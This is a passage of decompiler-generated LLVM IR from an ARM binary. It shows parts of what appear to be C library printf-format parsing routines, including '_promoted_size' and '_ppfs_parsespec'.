  %v1_10cc0 = add i32 %v3_10cbc, 7
  %v1_10cc4 = and i32 %v1_10cc0, -8
  store i32 %v1_10cc4, i32* %r3.global-to-local, align 4
  %v1_10cc8 = inttoptr i32 %v1_10cc4 to i32*
  %v2_10cc8 = load i32, i32* %v1_10cc8, align 8
  store i32 %v2_10cc8, i32* %r1.global-to-local, align 4
  %v3_10cc8 = or i32 %v1_10cc4, 4
  %v4_10cc8 = inttoptr i32 %v3_10cc8 to i32*
  %v5_10cc8 = load i32, i32* %v4_10cc8, align 4
  store i32 %v5_10cc8, i32* %r2.global-to-local, align 4
  %v1_10ccc = add i32 %v1_10cc4, 8
  store i32 %v1_10ccc, i32* %r3.global-to-local, align 4
  store i32 %v1_10ccc, i32* %v2_10c30, align 4
  %v0_10cd4 = load i32, i32* %ip.global-to-local, align 4
  %v1_10cd4 = inttoptr i32 %v0_10cd4 to i32*
  %v2_10cd4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_10cd4, i32* %v1_10cd4, align 4
  %v3_10cd4 = add i32 %v0_10cd4, 4
  %v4_10cd4 = inttoptr i32 %v3_10cd4 to i32*
  %v5_10cd4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_10cd4, i32* %v4_10cd4, align 4
  br label %dec_label_pc_10cec

dec_label_pc_10cdc:                               ; preds = %dec_label_pc_10c64, %dec_label_pc_10c50, %dec_label_pc_10c44, %dec_label_pc_10c84
  %v1_10cdc = add i32 %v3_10c30, 4
  store i32 %v1_10cdc, i32* %r3.global-to-local, align 4
  store i32 %v1_10cdc, i32* %v2_10c30, align 4
  %v0_10ce4 = load i32, i32* %r1.global-to-local, align 4
  %v1_10ce4 = inttoptr i32 %v0_10ce4 to i32*
  %v2_10ce4 = load i32, i32* %v1_10ce4, align 4
  store i32 %v2_10ce4, i32* %r3.global-to-local, align 4
  %v1_10ce8 = load i32, i32* %ip.global-to-local, align 4
  %v2_10ce8 = inttoptr i32 %v1_10ce8 to i32*
  store i32 %v2_10ce4, i32* %v2_10ce8, align 4
  br label %dec_label_pc_10cec

dec_label_pc_10cec:                               ; preds = %dec_label_pc_10cbc, %dec_label_pc_10ca8, %dec_label_pc_10c8c, %dec_label_pc_10cdc
  %v0_10cec = load i32, i32* %ip.global-to-local, align 4
  %v1_10cec = add i32 %v0_10cec, 8
  store i32 %v1_10cec, i32* %ip.global-to-local, align 4
  %v0_10cf4.pre.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_10cf0.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_10cf0.backedge

dec_label_pc_10cf0.backedge:                      ; preds = %dec_label_pc_10cec, %dec_label_pc_10c1c
  %v0_10cf0 = phi i32 [ %v0_10cf0.pre, %dec_label_pc_10cec ], [ %v0_10cf024, %dec_label_pc_10c1c ]
  %v0_10c28.be = phi i32 [ %v0_10cf4.pre.pre, %dec_label_pc_10cec ], [ %v1_10c28, %dec_label_pc_10c1c ]
  %v1_10cf0 = add i32 %v0_10cf0, 28
  %v2_10cf0 = inttoptr i32 %v1_10cf0 to i32*
  %v3_10cf0 = load i32, i32* %v2_10cf0, align 4
  store i32 %v3_10cf0, i32* %r3.global-to-local, align 4
  %v5_10cf8 = icmp slt i32 %v0_10c28.be, %v3_10cf0
  br i1 %v5_10cf8, label %dec_label_pc_10c1c, label %dec_label_pc_10cf0.dec_label_pc_10cfc.loopexit_crit_edge

dec_label_pc_10d00:                               ; preds = %entry
  br i1 %v6_10bc8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_10d00
  %v2_10d04 = add i32 %v0_10bb4, 36
  %v3_10d04 = inttoptr i32 %v2_10d04 to i8*
  %v4_10d04 = load i8, i8* %v3_10d04, align 1
  %v5_10d04 = zext i8 %v4_10d04 to i32
  %v5_10d08 = mul nuw nsw i32 %v5_10d04, 8
  %v6_10d08 = add i32 %v5_10d08, %v0_10bb4
  store i32 %v6_10d08, i32* %r3.global-to-local, align 4
  %v2_10d0c = add i32 %v6_10d08, 72
  %v3_10d0c = inttoptr i32 %v2_10d0c to i32*
  %v4_10d0c = load i32, i32* %v3_10d0c, align 4
  store i32 %v4_10d0c, i32* %r3.global-to-local, align 4
  store i32 %v4_10d0c, i32* %v2_10bc0, align 4
  %v0_10d14.pre = load i32, i32* @r0, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_10d00, %bb
  %v2_10d28 = phi i32 [ %v0_10d14.pre, %bb ], [ %v0_10bb4, %dec_label_pc_10d00 ]
  %v1_10d14 = add i32 %v2_10d28, 4
  %v2_10d14 = inttoptr i32 %v1_10d14 to i32*
  %v3_10d14 = load i32, i32* %v2_10d14, align 4
  store i32 %v3_10d14, i32* %r3.global-to-local, align 4
  %v6_10d18 = icmp eq i32 %v3_10d14, -2147483648
  br i1 %v6_10d18, label %bb16, label %dec_label_pc_10cfc

bb16:                                             ; preds = %.thread1
  %v2_10d1c = add i32 %v2_10d28, 37
  %v3_10d1c = inttoptr i32 %v2_10d1c to i8*
  %v4_10d1c = load i8, i8* %v3_10d1c, align 1
  %v5_10d1c = zext i8 %v4_10d1c to i32
  %v5_10d20 = mul nuw nsw i32 %v5_10d1c, 8
  %v6_10d20 = add i32 %v5_10d20, %v2_10d28
  store i32 %v6_10d20, i32* %r3.global-to-local, align 4
  %v2_10d24 = add i32 %v6_10d20, 72
  %v3_10d24 = inttoptr i32 %v2_10d24 to i32*
  %v4_10d24 = load i32, i32* %v3_10d24, align 4
  store i32 %v4_10d24, i32* %r3.global-to-local, align 4
  store i32 %v4_10d24, i32* %v2_10d14, align 4
  %v0_10d2c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_10cfc

dec_label_pc_10cf0.dec_label_pc_10cfc.loopexit_crit_edge: ; preds = %dec_label_pc_10cf0.backedge
  br label %dec_label_pc_10cfc.loopexit

dec_label_pc_10cfc.loopexit:                      ; preds = %dec_label_pc_10cf0.dec_label_pc_10cfc.loopexit_crit_edge, %dec_label_pc_10c10
  %v0_10cf0.lcssa = phi i32 [ %v0_10cf0, %dec_label_pc_10cf0.dec_label_pc_10cfc.loopexit_crit_edge ], [ %v0_10cf017, %dec_label_pc_10c10 ]
  br label %dec_label_pc_10cfc

dec_label_pc_10cfc:                               ; preds = %dec_label_pc_10cfc.loopexit, %.thread1, %bb16
  %v1_10d4c = phi i32 [ %v0_10cf0.lcssa, %dec_label_pc_10cfc.loopexit ], [ %v2_10d28, %.thread1 ], [ %v0_10d2c.pre, %bb16 ]
  %v1_10d2c = add i32 %v1_10d4c, 8
  %v2_10d2c = inttoptr i32 %v1_10d2c to i32*
  %v3_10d2c = load i32, i32* %v2_10d2c, align 4
  store i32 %v3_10d2c, i32* %r1.global-to-local, align 4
  %v1_10d30 = icmp slt i32 %v3_10d2c, 0
  br i1 %v1_10d30, label %dec_label_pc_10d38, label %dec_label_pc_10d58

dec_label_pc_10d38:                               ; preds = %dec_label_pc_10cfc
  %v1_10d38 = add i32 %v1_10d4c, 16
  %v2_10d38 = inttoptr i32 %v1_10d38 to i32*
  %v3_10d38 = load i32, i32* %v2_10d38, align 4
  %v1_10d40 = sub i32 0, %v3_10d2c
  store i32 %v1_10d40, i32* %r1.global-to-local, align 4
  %v1_10d3c = and i32 %v3_10d38, -10
  %v1_10d44 = or i32 %v1_10d3c, 8
  store i32 %v1_10d44, i32* %r3.global-to-local, align 4
  store i32 32, i32* %r2.global-to-local, align 4
  %v2_10d4c = add i32 %v1_10d4c, 20
  %v3_10d4c = inttoptr i32 %v2_10d4c to i32*
  store i32 32, i32* %v3_10d4c, align 4
  %v0_10d50 = load i32, i32* %r1.global-to-local, align 4
  %v1_10d50 = load i32, i32* @r0, align 4
  %v2_10d50 = add i32 %v1_10d50, 8
  %v3_10d50 = inttoptr i32 %v2_10d50 to i32*
  store i32 %v0_10d50, i32* %v3_10d50, align 4
  %v0_10d54 = load i32, i32* %r3.global-to-local, align 4
  %v1_10d54 = load i32, i32* @r0, align 4
  %v2_10d54 = add i32 %v1_10d54, 16
  %v3_10d54 = inttoptr i32 %v2_10d54 to i32*
  store i32 %v0_10d54, i32* %v3_10d54, align 4
  %v1_10d5c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_10d58

dec_label_pc_10d58:                               ; preds = %dec_label_pc_10cfc, %dec_label_pc_10d38
  %v1_10d5c = phi i32 [ %v1_10d4c, %dec_label_pc_10cfc ], [ %v1_10d5c.pre, %dec_label_pc_10d38 ]
  %v2_10d58 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10d58, i32* @r4, align 4
  ret i32 %v1_10d5c

; uselistorder directives
  uselistorder i32 %v2_10d28, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10c28.be, { 1, 0 }
  uselistorder i32 %v0_10cf0, { 1, 2, 0 }
  uselistorder i32 %v3_10c30, { 3, 1, 0, 2, 4 }
  uselistorder i32* %v2_10c30, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 %v3_10c20, { 1, 2, 0, 8, 5, 3, 4, 7, 6, 9, 10, 11 }
  uselistorder i32 %v0_10c2823, { 1, 0 }
  uselistorder i32 %v0_10cf024, { 0, 2, 1 }
  uselistorder i32 %v0_10cf017, { 2, 0, 1 }
  uselistorder i32 %v0_10bb4, { 1, 0, 4, 2, 3, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 16, 7, 8, 9, 10, 11, 12, 13, 14, 15, 23, 17, 18, 19, 20, 21, 22 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 7, 3, 4, 5, 6, 8, 9, 10 }
  uselistorder label %dec_label_pc_10d58, { 1, 0 }
  uselistorder label %dec_label_pc_10cfc, { 0, 2, 1 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_10cec, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10cdc, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10cbc, { 1, 0 }
  uselistorder label %dec_label_pc_10ca8, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_10c1c, { 1, 0 }
  uselistorder label %dec_label_pc_10c10, { 1, 0 }
  uselistorder label %dec_label_pc_10be8, { 1, 0 }
}

define i32 @_promoted_size() local_unnamed_addr {
entry:
  %v1_10d80.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_10d7c

dec_label_pc_10d7c:                               ; preds = %dec_label_pc_10d88, %entry
  %v0_10d7c = phi i32 [ %v1_10d7c, %dec_label_pc_10d88 ], [ add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -36938), %entry ]
  %v1_10d7c = add i32 %v0_10d7c, -2
  %v2_10d7c = inttoptr i32 %v1_10d7c to i16*
  %v3_10d7c = load i16, i16* %v2_10d7c, align 2
  %v4_10d7c = sext i16 %v3_10d7c to i32
  store i32 %v1_10d7c, i32* @ip, align 4
  %v9_10d80 = icmp eq i32 %v4_10d7c, %v1_10d80.pre
  br i1 %v9_10d80, label %dec_label_pc_10d7c.dec_label_pc_10d90_crit_edge, label %dec_label_pc_10d88

dec_label_pc_10d7c.dec_label_pc_10d90_crit_edge:  ; preds = %dec_label_pc_10d7c
  br label %dec_label_pc_10d90

dec_label_pc_10d88:                               ; preds = %dec_label_pc_10d7c
  %tmp = icmp ugt i32 %v1_10d7c, add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -36962)
  br i1 %tmp, label %dec_label_pc_10d7c, label %dec_label_pc_10d90.loopexit

dec_label_pc_10d90.loopexit:                      ; preds = %dec_label_pc_10d88
  br label %dec_label_pc_10d90

dec_label_pc_10d90:                               ; preds = %dec_label_pc_10d90.loopexit, %dec_label_pc_10d7c.dec_label_pc_10d90_crit_edge
  %v2_10da0.pre-phi = sub i32 %v1_10d7c, add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -36962)
  store i32 %v2_10da0.pre-phi, i32* @r2, align 4
  %v4_10da4 = sdiv i32 %v2_10da0.pre-phi, 2
  %v5_10da4 = add i32 %v4_10da4, add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -36938)
  %v6_10da4 = inttoptr i32 %v5_10da4 to i8*
  %v7_10da4 = load i8, i8* %v6_10da4, align 1
  %v9_10da4 = zext i8 %v7_10da4 to i32
  ret i32 %v9_10da4

; uselistorder directives
  uselistorder i32 %v2_10da0.pre-phi, { 1, 0 }
  uselistorder i32 %v1_10d7c, { 1, 0, 3, 4, 2 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -36962), { 1, 0 }
}

define i32 @_ppfs_parsespec(i8* %arg1) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp117 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-111 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-120 = alloca i8*, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_10db8 = load i32, i32* @r4, align 4
  store i32 %v3_10db8, i32* %stack_var_-36, align 4
  %v6_10db8 = load i32, i32* @r5, align 4
  %v27_10db8 = load i32, i32* @lr, align 4
  %v0_10dbc = load i32, i32* %r0.global-to-local, align 4
  %v1_10dbc = add i32 %v0_10dbc, 16
  %v2_10dbc = inttoptr i32 %v1_10dbc to i32*
  %v3_10dbc = load i32, i32* %v2_10dbc, align 4
  %v1_10dc4 = and i32 %v3_10dbc, 128
  store i32 %v1_10dc4, i32* @r4, align 4
  %v2_10dc4 = icmp eq i32 %v1_10dc4, 0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 %v0_10dbc, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* @lr, align 4
  %v1_10dec = add i32 %v0_10dbc, 24
  %v2_10dec = inttoptr i32 %v1_10dec to i32*
  %v3_10dec = load i32, i32* %v2_10dec, align 4
  store i32 %v3_10dec, i32* %fp.global-to-local, align 4
  br i1 %v2_10dc4, label %.dec_label_pc_10e40_crit_edge, label %dec_label_pc_10df8

.dec_label_pc_10e40_crit_edge:                    ; preds = %entry
  %v2_10df0 = inttoptr i32 %v0_10dbc to i32*
  %v3_10df0 = load i32, i32* %v2_10df0, align 4
  store i32 %v3_10df0, i32* %r0.global-to-local, align 4
  %.pre = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_10e40

dec_label_pc_10df8:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10e08 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_10dfc

dec_label_pc_10dfc:                               ; preds = %dec_label_pc_10e2c.dec_label_pc_10dfc_crit_edge, %dec_label_pc_10df8
  %v1_10e0c = phi i32 [ %v1_10e1c, %dec_label_pc_10e2c.dec_label_pc_10dfc_crit_edge ], [ 0, %dec_label_pc_10df8 ]
  %v0_10dfc = phi i32 [ %v0_10dfc.pre, %dec_label_pc_10e2c.dec_label_pc_10dfc_crit_edge ], [ %v0_10dbc, %dec_label_pc_10df8 ]
  %v1_10dfc = inttoptr i32 %v0_10dfc to i32*
  %v2_10dfc = load i32, i32* %v1_10dfc, align 4
  %v4_10e00 = mul i32 %v1_10e0c, 4
  %v5_10e00 = add i32 %v2_10dfc, %v4_10e00
  store i32 %v5_10e00, i32* %r3.global-to-local, align 4
  %v1_10e04 = add i32 %v5_10e00, -4
  %v2_10e04 = inttoptr i32 %v1_10e04 to i8*
  %v3_10e04 = load i8, i8* %v2_10e04, align 1
  %v4_10e04 = zext i8 %v3_10e04 to i32
  store i32 %v4_10e04, i32* %r1.global-to-local, align 4
  store i32 %v2_10e08, i32* @ip, align 4
  %v2_10e0c = add i32 %v1_10e0c, %v2_10e08
  store i32 %v2_10e0c, i32* %r2.global-to-local, align 4
  %v3_10e10 = add i32 %v2_10e0c, -72
  %v4_10e10 = inttoptr i32 %v3_10e10 to i8*
  store i8 %v3_10e04, i8* %v4_10e10, align 1
  %v0_10e14 = load i32, i32* %r3.global-to-local, align 4
  %v1_10e14 = add i32 %v0_10e14, -4
  %v2_10e14 = inttoptr i32 %v1_10e14 to i32*
  %v3_10e14 = load i32, i32* %v2_10e14, align 4
  store i32 %v3_10e14, i32* %r3.global-to-local, align 4
  %v0_10e18 = load i32, i32* %r1.global-to-local, align 4
  %v9_10e18 = icmp eq i32 %v0_10e18, %v3_10e14
  %v0_10e1c = load i32, i32* %r0.global-to-local, align 4
  %v1_10e1c = add i32 %v0_10e1c, 1
  store i32 %v1_10e1c, i32* %r0.global-to-local, align 4
  br i1 %v9_10e18, label %dec_label_pc_10e24, label %dec_label_pc_112e8

dec_label_pc_10e24:                               ; preds = %dec_label_pc_10dfc
  %v2_10e24 = icmp eq i32 %v3_10e14, 0
  br i1 %v2_10e24, label %dec_label_pc_10e34, label %dec_label_pc_10e2c

dec_label_pc_10e2c:                               ; preds = %dec_label_pc_10e24
  %tmp182 = icmp ult i32 %v1_10e1c, 32
  br i1 %tmp182, label %dec_label_pc_10e2c.dec_label_pc_10dfc_crit_edge, label %dec_label_pc_10e34

dec_label_pc_10e2c.dec_label_pc_10dfc_crit_edge:  ; preds = %dec_label_pc_10e2c
  %v0_10dfc.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10dfc

dec_label_pc_10e34:                               ; preds = %dec_label_pc_10e2c, %dec_label_pc_10e24
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_10e3c = ptrtoint i32* %stack_var_-111 to i32
  store i32 %v2_10e3c, i32* %r0.global-to-local, align 4
  %v0_10e4c.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_10e40

dec_label_pc_10e40:                               ; preds = %.dec_label_pc_10e40_crit_edge, %dec_label_pc_10e34
  %v3_10e74.pre-phi = phi i32 [ %.pre, %.dec_label_pc_10e40_crit_edge ], [ %v2_10e08, %dec_label_pc_10e34 ]
  %v0_10e6c64 = phi i32 [ %v3_10df0, %.dec_label_pc_10e40_crit_edge ], [ %v2_10e3c, %dec_label_pc_10e34 ]
  %v0_10e4c = phi i32 [ ptrtoint (i32* @global_var_268d4.582 to i32), %.dec_label_pc_10e40_crit_edge ], [ %v0_10e4c.pre, %dec_label_pc_10e34 ]
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 3528, i32* %r2.global-to-local, align 4
  %v2_10e4c = add i32 %v0_10e4c, -36900
  store i32 %v2_10e4c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 -4, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  %v4_10e60 = inttoptr i32 %v2_10e4c to i8*
  store i8* %v4_10e60, i8** %stack_var_-120, align 4
  br label %dec_label_pc_10e6c

dec_label_pc_10e68:                               ; preds = %.thread20, %dec_label_pc_10f9c
  %v0_10e68 = phi i32 [ %v2_11014, %.thread20 ], [ %v0_10f7876, %dec_label_pc_10f9c ]
  %stack_var_-44.0 = phi i32 [ %stack_var_-44.3, %.thread20 ], [ %stack_var_-44.2, %dec_label_pc_10f9c ]
  store i32 %v0_10e68, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10e6c

dec_label_pc_10e6c:                               ; preds = %dec_label_pc_10e40, %dec_label_pc_10e68
  %v1_10e80 = phi i32 [ %v0_10e6c64, %dec_label_pc_10e40 ], [ %v0_10e68, %dec_label_pc_10e68 ]
  %stack_var_-44.1 = phi i32 [ %tmp117, %dec_label_pc_10e40 ], [ %stack_var_-44.0, %dec_label_pc_10e68 ]
  %v1_10e6c = inttoptr i32 %v1_10e80 to i8*
  %v2_10e6c = load i8, i8* %v1_10e6c, align 1
  %v3_10e6c = zext i8 %v2_10e6c to i32
  store i32 %v3_10e6c, i32* %r3.global-to-local, align 4
  %v7_10e70 = icmp eq i8 %v2_10e6c, 42
  br i1 %v7_10e70, label %bb, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_10e6c
  store i32 %v1_10e80, i32* %r6.global-to-local, align 4
  %v0_10e84 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10e84, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10ecc.preheader

bb:                                               ; preds = %dec_label_pc_10e6c
  %v1_10e78 = load i32, i32* %r8.global-to-local, align 4
  %v2_10e78 = load i32, i32* %sb.global-to-local, align 4
  %v4_10e78 = mul i32 %v2_10e78, %v1_10e78
  %v5_10e78 = add i32 %v4_10e78, %v3_10e74.pre-phi
  store i32 %v5_10e78, i32* %r3.global-to-local, align 4
  %v2_10e80 = add i32 %v1_10e80, 1
  store i32 %v2_10e80, i32* %r6.global-to-local, align 4
  %v0_10e84111 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10e84111, i32* %r1.global-to-local, align 4
  %v3_10e88 = add i32 %v5_10e78, -40
  %v4_10e88 = inttoptr i32 %v3_10e88 to i32*
  store i32 %v0_10e84111, i32* %v4_10e88, align 4
  %v0_10ed0.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10ecc.preheader

dec_label_pc_10ecc.preheader:                     ; preds = %.thread8, %bb
  %v0_10ed0.pre = phi i32 [ %v1_10e80, %.thread8 ], [ %v0_10ed0.pre.pre, %bb ]
  %v0_10ed4.pre = load i32, i32* @lr, align 4
  %v2_10ed4 = add i32 %v0_10ed4.pre, 3528
  %v3_10ed4 = inttoptr i32 %v2_10ed4 to i32*
  br label %dec_label_pc_10ecc

dec_label_pc_10e90:                               ; preds = %dec_label_pc_10ecc
  store i32 214748363, i32* %r3.global-to-local, align 4
  %v0_10e94 = load i32, i32* %r1.global-to-local, align 4
  %v2_10e94 = add i32 %v0_10e94, -214748363
  %tmp139 = sub i32 214748362, %v0_10e94
  %v6_10e94 = and i32 %tmp139, %v0_10e94
  %v7_10e94 = icmp slt i32 %v6_10e94, 0
  %v8_10e94 = icmp slt i32 %v2_10e94, 0
  %v9_10e94 = icmp eq i32 %v0_10e94, 214748363
  %v3_10e98 = xor i1 %v8_10e94, %v7_10e94
  %v4_10e98 = or i1 %v9_10e94, %v3_10e98
  br i1 %v4_10e98, label %dec_label_pc_10eb0, label %dec_label_pc_10e9c

dec_label_pc_10e9c:                               ; preds = %dec_label_pc_10e90
  store i32 214748364, i32* %r2.global-to-local, align 4
  %v9_10ea0 = icmp eq i32 %v0_10e94, 214748364
  br i1 %v9_10ea0, label %dec_label_pc_10ea8, label %dec_label_pc_10ec8

dec_label_pc_10ea8:                               ; preds = %dec_label_pc_10e9c
  %v8_10eac = icmp ugt i8 %v2_10ed0, 55
  br i1 %v8_10eac, label %dec_label_pc_10ec8, label %dec_label_pc_10eb0

dec_label_pc_10eb0:                               ; preds = %dec_label_pc_10ea8, %dec_label_pc_10e90
  %v2_10eb4 = mul i32 %v0_10e94, 10
  %v1_10eb8 = add i32 %v2_10eb4, -48
  store i32 %v1_10eb8, i32* %r3.global-to-local, align 4
  %v2_10ebc = add i32 %v1_10eb8, %v3_10ed0
  br label %dec_label_pc_10ec8

dec_label_pc_10ec8:                               ; preds = %dec_label_pc_10ea8, %dec_label_pc_10e9c, %dec_label_pc_10eb0
  %storemerge = phi i32 [ %v2_10ebc, %dec_label_pc_10eb0 ], [ 2147483647, %dec_label_pc_10e9c ], [ 2147483647, %dec_label_pc_10ea8 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_10ec8 = add i32 %v0_10f50, 1
  store i32 %v1_10ec8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10ecc

dec_label_pc_10ecc:                               ; preds = %dec_label_pc_10ecc.preheader, %dec_label_pc_10ec8
  %v0_10f50 = phi i32 [ %v0_10ed0.pre, %dec_label_pc_10ecc.preheader ], [ %v1_10ec8, %dec_label_pc_10ec8 ]
  store i32 3528, i32* %r2.global-to-local, align 4
  %v1_10ed0 = inttoptr i32 %v0_10f50 to i8*
  %v2_10ed0 = load i8, i8* %v1_10ed0, align 1
  %v3_10ed0 = zext i8 %v2_10ed0 to i32
  store i32 %v3_10ed0, i32* @ip, align 4
  %v4_10ed4 = load i32, i32* %v3_10ed4, align 4
  store i32 %v4_10ed4, i32* %r3.global-to-local, align 4
  %v2_10ed8 = mul nuw nsw i32 %v3_10ed0, 2
  store i32 %v2_10ed8, i32* %r2.global-to-local, align 4
  %v2_10edc = add i32 %v2_10ed8, %v4_10ed4
  %v3_10edc = inttoptr i32 %v2_10edc to i16*
  %v4_10edc = load i16, i16* %v3_10edc, align 2
  %v6_10edc = zext i16 %v4_10edc to i32
  store i32 %v6_10edc, i32* %r3.global-to-local, align 4
  %v1_10ee0 = and i32 %v6_10edc, 8
  %v2_10ee0 = icmp eq i32 %v1_10ee0, 0
  br i1 %v2_10ee0, label %dec_label_pc_10ee8, label %dec_label_pc_10e90

dec_label_pc_10ee8:                               ; preds = %dec_label_pc_10ecc
  %v0_10ee8 = load i32, i32* %r0.global-to-local, align 4
  %v1_10ee8 = add i32 %v0_10ee8, -1
  %v2_10ee8 = inttoptr i32 %v1_10ee8 to i8*
  %v3_10ee8 = load i8, i8* %v2_10ee8, align 1
  %v4_10ee8 = zext i8 %v3_10ee8 to i32
  store i32 %v4_10ee8, i32* %r3.global-to-local, align 4
  %v7_10eec = icmp eq i8 %v3_10ee8, 37
  br i1 %v7_10eec, label %dec_label_pc_10ef4, label %dec_label_pc_10fb4

dec_label_pc_10ef4:                               ; preds = %dec_label_pc_10ee8
  %v7_10ef4 = icmp eq i8 %v2_10ed0, 36
  %. = zext i1 %v7_10ef4 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v0_10f00 = load i32, i32* %r1.global-to-local, align 4
  %tmp143 = icmp slt i32 %v0_10f00, 1
  br i1 %tmp143, label %bb144, label %thread-pre-split

bb144:                                            ; preds = %dec_label_pc_10ef4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_10ef4, %bb144
  %v0_10f08 = phi i32 [ 0, %bb144 ], [ %., %dec_label_pc_10ef4 ]
  %v2_10f08 = icmp eq i32 %v0_10f08, 0
  %v0_10f3c = load i32, i32* %fp.global-to-local, align 4
  br i1 %v2_10f08, label %dec_label_pc_10f3c, label %dec_label_pc_10f10

dec_label_pc_10f10:                               ; preds = %thread-pre-split
  %v2_10f3c = icmp eq i32 %v0_10f3c, 0
  %v1_10f14 = add i32 %v0_10f50, 1
  store i32 %v1_10f14, i32* %r0.global-to-local, align 4
  br i1 %v2_10f3c, label %dec_label_pc_112e8, label %dec_label_pc_10f1c

dec_label_pc_10f1c:                               ; preds = %dec_label_pc_10f10
  %v2_10f1c = sub i32 %v0_10f00, %v0_10f3c
  %v4_10f1c = xor i32 %v0_10f3c, %v0_10f00
  %v5_10f1c = xor i32 %v2_10f1c, %v0_10f00
  %v6_10f1c = and i32 %v5_10f1c, %v4_10f1c
  %v7_10f1c = icmp slt i32 %v6_10f1c, 0
  %v8_10f1c = icmp slt i32 %v2_10f1c, 0
  %v9_10f1c = icmp eq i32 %v0_10f00, %v0_10f3c
  %v3_10f20 = xor i1 %v8_10f1c, %v7_10f1c
  %v4_10f20 = or i1 %v9_10f1c, %v3_10f20
  br i1 %v4_10f20, label %dec_label_pc_10f30, label %bb145

bb145:                                            ; preds = %dec_label_pc_10f1c
  store i32 %v0_10f00, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_10f30

dec_label_pc_10f2c:                               ; preds = %dec_label_pc_10f50, %dec_label_pc_10f58
  %v0_10f2c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10f2c, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_10f30

dec_label_pc_10f30:                               ; preds = %bb145, %dec_label_pc_10f1c, %dec_label_pc_10f2c
  %v0_10f30 = phi i32 [ %v0_10ee8, %dec_label_pc_10f2c ], [ %v1_10f14, %dec_label_pc_10f1c ], [ %v1_10f14, %bb145 ]
  %stack_var_-44.2 = phi i32 [ %stack_var_-44.1, %dec_label_pc_10f2c ], [ %v0_10f00, %dec_label_pc_10f1c ], [ %v0_10f00, %bb145 ]
  store i32 %v0_10f30, i32* %r6.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  %v2_10f6c.pre = load i8*, i8** %stack_var_-120, align 4
  %v3_10f6c = ptrtoint i8* %v2_10f6c.pre to i32
  br label %dec_label_pc_10f6c

dec_label_pc_10f3c:                               ; preds = %thread-pre-split
  %tmp146 = icmp slt i32 %v0_10f3c, 1
  br i1 %tmp146, label %dec_label_pc_10f50, label %dec_label_pc_10f44

dec_label_pc_10f44:                               ; preds = %dec_label_pc_10f3c
  %v7_10f44 = icmp eq i8 %v2_10ed0, 109
  br i1 %v7_10f44, label %dec_label_pc_10fb4, label %dec_label_pc_112e8

dec_label_pc_10f50:                               ; preds = %dec_label_pc_10f3c
  %tmp183 = icmp ugt i32 %v0_10f50, %v0_10ee8
  br i1 %tmp183, label %dec_label_pc_10f58, label %dec_label_pc_10f2c

dec_label_pc_10f58:                               ; preds = %dec_label_pc_10f50
  %v1_10f58 = inttoptr i32 %v0_10ee8 to i8*
  %v2_10f58 = load i8, i8* %v1_10f58, align 1
